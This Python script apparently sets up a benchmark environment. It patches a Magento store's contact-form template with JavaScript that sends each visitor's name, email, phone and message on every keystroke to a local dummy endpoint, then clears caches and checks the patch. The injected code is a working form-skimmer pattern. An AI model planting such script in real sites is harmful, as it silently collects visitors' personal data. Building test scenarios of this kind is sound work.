#!/usr/bin/env python3
"""
Patch Magento contact form to post data in real-time to a dummy endpoint.

This script modifies the contact form template to send form data as JSON
to localhost/dummy_bin on every keystroke (no debouncing).

Usage:
    As module: apply_patch(handler)
    As script: python p01_contact_form.py
"""

import contextlib
import logging
import textwrap

from webarena_verified.environments import SiteInstanceHandler

logger = logging.getLogger(__name__)


def backup_form_template(handler: SiteInstanceHandler) -> None:
    """Backup the original contact form template."""
    file_path = "/var/www/magento2/vendor/magento/module-contact/view/frontend/templates/form.phtml"
    backup_path = f"{file_path}.bak"

    handler.exec_cmd(
        ["cp", file_path, backup_path],
        check=True,
    )
    logger.info(f"Backed up {file_path} to {backup_path}")


def restore_from_backup(handler: SiteInstanceHandler) -> None:
    """Restore the form template from backup if it exists."""
    file_path = "/var/www/magento2/vendor/magento/module-contact/view/frontend/templates/form.phtml"
    backup_path = f"{file_path}.bak"

    # Check if backup exists
    result = handler.exec_cmd(
        ["test", "-f", backup_path],
        capture_output=True,
    )

    if result.returncode == 0:
        # Backup exists, restore it
        handler.exec_cmd(
            ["cp", backup_path, file_path],
            check=True,
        )
        logger.info(f"Restored original form from {backup_path}")
    else:
        logger.info("No backup found, will patch current file")


def patch_contact_form(handler: SiteInstanceHandler) -> None:
    """Add real-time form posting JavaScript to the contact form."""
    file_path = "/var/www/magento2/vendor/magento/module-contact/view/frontend/templates/form.phtml"

    # Read the current file
    result = handler.exec_cmd(
        ["cat", file_path],
        capture_output=True,
        text=True,
        check=True,
    )

    content = result.stdout

    # JavaScript code to add real-time form posting
    realtime_script = textwrap.dedent("""
        <script>
        (function() {
            'use strict';

            // Get all form inputs
            const form = document.getElementById('contact-form');
            const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], textarea');

            // Function to collect all form data
            function collectFormData() {
                const data = {
                    form_id: form.id,
                    form_name: form.getAttribute('name') || '',
                    name: document.getElementById('name').value,
                    email: document.getElementById('email').value,
                    telephone: document.getElementById('telephone').value,
                    comment: document.getElementById('comment').value
                };
                return data;
            }

            // Function to post data to dummy endpoint
            function postToDummyEndpoint() {
                const formData = collectFormData();

                fetch('http://localhost:6666/dummy_bin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData)
                }).catch(function(error) {
                    // Silently ignore errors as we don't care about response
                    console.log('Posted to dummy_bin:', formData);
                });
            }

            // Attach input event listeners to all form fields
            inputs.forEach(function(input) {
                input.addEventListener('input', postToDummyEndpoint);
            });
        })();
        </script>
        """).strip()

    # Insert the script before the closing </form> tag or at the end
    if "</form>" in content:
        # Insert before closing form tag
        content = content.replace("</form>", realtime_script + "\n</form>")
    else:
        # Append at the end if no closing form tag found
        content += realtime_script

    # Write the modified content back
    handler.exec_cmd(
        ["tee", file_path],
        input_data=content,
        capture_output=True,
        check=True,
    )
    logger.info(f"Patched {file_path} with real-time form posting")


def clear_magento_cache(handler: SiteInstanceHandler) -> None:
    """Clear Magento cache to apply changes."""
    logger.info("Clearing Magento cache...")

    # Try multiple cache clearing methods
    commands = [
        ["php", "/var/www/magento2/bin/magento", "cache:clean"],
        ["php", "/var/www/magento2/bin/magento", "cache:flush"],
        ["rm", "-rf", "/var/www/magento2/var/cache/*"],
        ["rm", "-rf", "/var/www/magento2/var/page_cache/*"],
        ["rm", "-rf", "/var/www/magento2/var/view_preprocessed/*"],
    ]

    for cmd in commands:
        with contextlib.suppress(Exception):
            handler.exec_cmd(cmd, capture_output=True, check=False)

    logger.info("Cleared Magento cache")


def verify_patch(handler: SiteInstanceHandler) -> bool:
    """Verify that the patch was applied correctly."""
    file_path = "/var/www/magento2/vendor/magento/module-contact/view/frontend/templates/form.phtml"

    result = handler.exec_cmd(
        ["grep", "-c", "dummy_bin", file_path],
        capture_output=True,
        text=True,
    )

    if result.returncode == 0 and int(result.stdout.strip()) > 0:
        logger.info("Patch applied successfully")
        return True
    else:
        logger.error("Patch verification failed")
        return False


def apply_patch(handler: SiteInstanceHandler) -> bool:
    """Apply the contact form real-time posting patch.

    Args:
        handler: SiteInstanceHandler for executing commands

    Returns:
        True if patch was applied successfully, False otherwise
    """
    try:
        logger.info("Patching Magento contact form for real-time posting...")

        # Restore from backup if it exists (to allow re-running the script)
        restore_from_backup(handler)

        # Backup original file
        backup_form_template(handler)

        # Apply patch
        patch_contact_form(handler)

        # Clear cache
        clear_magento_cache(handler)

        # Verify
        if not verify_patch(handler):
            logger.error("Patch verification failed")
            return False

        logger.info("Contact form patch applied successfully")
        return True

    except Exception as e:
        logger.error(f"Error applying patch: {e}")
        return False
